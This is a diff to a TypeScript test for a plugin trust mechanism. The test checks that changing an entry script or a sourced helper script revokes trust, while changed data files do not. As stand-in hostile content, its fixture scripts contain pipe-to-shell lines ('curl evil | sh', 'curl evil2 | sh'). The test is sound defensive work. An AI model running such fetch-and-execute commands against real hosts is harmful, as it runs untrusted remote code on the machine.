@@ -100,7 +100,7 @@ test("a trusted plugin loses trust when its agent entry script content changes",
   const directory = fs.mkdtempSync(path.join(os.tmpdir(), "forwardx-plugin-trust-"));
   const packageDir = path.join(directory, "pkg");
   fs.mkdirSync(packageDir);
-  const makePackage = (name: string, script: string) => {
+  const makePackage = (name: string, script: string, helper = "echo helper\n", data = "1.1.1.1\n") => {
     fs.writeFileSync(path.join(packageDir, "forwardx-plugin.json"), JSON.stringify({
       id: "trust-demo",
       name: "Trust demo",
@@ -116,14 +116,20 @@ test("a trusted plugin loses trust when its agent entry script content changes",
       }],
     }));
     fs.writeFileSync(path.join(packageDir, "run.sh"), script);
+    // 入口脚本会 source 同目录的 lib.sh：它变了一样要撤销信任。
+    fs.writeFileSync(path.join(packageDir, "lib.sh"), helper);
+    fs.mkdirSync(path.join(packageDir, "data"), { recursive: true });
+    fs.writeFileSync(path.join(packageDir, "data", "list.txt"), data);
     const archive = path.join(directory, `${name}.tar.gz`);
-    const tar = spawnSync("tar", ["-czf", archive, "-C", packageDir, "forwardx-plugin.json", "run.sh"], { encoding: "utf8" });
+    const tar = spawnSync("tar", ["-czf", archive, "-C", packageDir, "forwardx-plugin.json", "run.sh", "lib.sh", "data/list.txt"], { encoding: "utf8" });
     assert.equal(tar.status, 0, tar.stderr);
     return archive;
   };
   const v1 = makePackage("v1", "echo hello\n");
   const v2same = makePackage("v2same", "echo hello\n");
   const v3changed = makePackage("v3changed", "curl evil | sh\n");
+  const v4data = makePackage("v4data", "curl evil | sh\n", "echo helper\n", "2.2.2.2\n");
+  const v5helper = makePackage("v5helper", "curl evil | sh\n", "curl evil2 | sh\n", "2.2.2.2\n");
 
   const script = String.raw`
     import assert from "node:assert/strict";
@@ -149,6 +155,11 @@ test("a trusted plugin loses trust when its agent entry script content changes",
       assert.equal(await trusted(), true, "re-installing identical scripts keeps trust");
       await install(process.env.V3CHANGED);
       assert.equal(await trusted(), false, "a changed agent entry script must drop trust");
+      await plugins.setPluginTrusted("trust-demo", true);
+      await install(process.env.V4DATA);
+      assert.equal(await trusted(), true, "refreshed data files keep trust");
+      await install(process.env.V5HELPER);
+      assert.equal(await trusted(), false, "a changed helper script next to the entry must drop trust");
     } finally {
       await runtime.closeDatabase().catch(() => undefined);
     }
@@ -164,6 +175,8 @@ test("a trusted plugin loses trust when its agent entry script content changes",
         V1: v1,
         V2SAME: v2same,
         V3CHANGED: v3changed,
+        V4DATA: v4data,
+        V5HELPER: v5helper,
       },
       encoding: "utf8",
       timeout: 60_000,
